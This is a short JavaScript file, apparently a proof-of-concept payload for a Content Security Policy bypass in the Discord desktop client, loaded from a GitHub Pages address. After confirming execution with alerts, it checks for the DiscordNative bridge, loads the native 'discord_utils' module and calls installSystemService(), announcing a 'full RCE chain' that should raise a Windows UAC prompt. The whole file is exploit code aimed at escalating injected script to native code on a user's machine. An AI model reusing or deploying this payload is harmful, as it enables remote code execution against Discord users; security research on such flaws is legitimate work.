// SIMPLE CSP BYPASS TEST PAYLOAD
// This is a minimal payload to test if CSP bypass works

console.log("🔥 CSP BYPASS SUCCESSFUL!");
console.log("GitHub Pages payload loaded!");

// Simple alert to confirm execution
alert("🎉 CSP BYPASS WORKS!\n\nPayload loaded from:\nhttps://getcia.github.io/test3/testpayload.js");

// Log that we're in Discord context
console.log("Window location:", window.location.href);
console.log("DiscordNative available:", typeof DiscordNative !== 'undefined');

// If DiscordNative exists, try to use it
if (typeof DiscordNative !== 'undefined') {
    console.log("✅ DiscordNative is available!");

    try {
        const utils = DiscordNative.nativeModules.requireModule('discord_utils');
        console.log("✅ discord_utils loaded!");

        // Try installSystemService
        utils.installSystemService()
            .then(result => {
                console.log("🎉 installSystemService() SUCCESS!");
                alert("🔥 FULL RCE CHAIN COMPLETE!\n\nUAC prompt should appear!");
            })
            .catch(error => {
                console.log("installSystemService() failed:", error.message);
            });
    } catch (e) {
        console.log("Error loading discord_utils:", e.message);
    }
} else {
    console.log("⚠️ DiscordNative not available (not in Discord context)");
}
